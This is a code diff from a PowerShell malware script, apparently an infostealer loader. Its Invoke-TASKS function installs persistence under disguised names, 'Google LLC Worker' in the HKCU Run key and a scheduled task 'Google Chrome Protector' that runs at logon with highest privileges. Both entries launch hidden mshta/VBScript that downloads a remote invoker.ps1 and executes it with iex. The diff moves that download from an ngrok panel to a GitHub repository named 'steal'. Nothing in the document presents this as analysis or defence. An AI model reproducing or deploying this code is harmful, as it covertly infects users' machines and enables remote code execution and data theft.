@@ -200,7 +200,7 @@ function Invoke-TASKS {
 	if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
 		$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 		$regName = "Google LLC Worker"
-		$regValue = "mshta.exe vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://panel.ngrok.app/main/winrar/zakrep/invoker.ps1'|iex`",0)(window.close)"
+		$regValue = "mshta.exe vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://github.com/encrypthub/steal/raw/main/zakrep/invoker.ps1'|iex`",0)(window.close)"
 
 		New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
 
@@ -218,7 +218,7 @@ function Invoke-TASKS {
 		if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
 			Unregister-ScheduledTask -TaskName $backName -Confirm:$false
 		}
-		$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://panel.ngrok.app/main/winrar/zakrep/invoker.ps1'|iex`",0)(window.close)"
+		$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://github.com/encrypthub/steal/raw/main/zakrep/invoker.ps1'|iex`",0)(window.close)"
 		$task_trigger = New-ScheduledTaskTrigger -AtLogOn
 		$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 		Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $backName -Description "Google Chrome Protector" -RunLevel Highest -Force | Out-Null
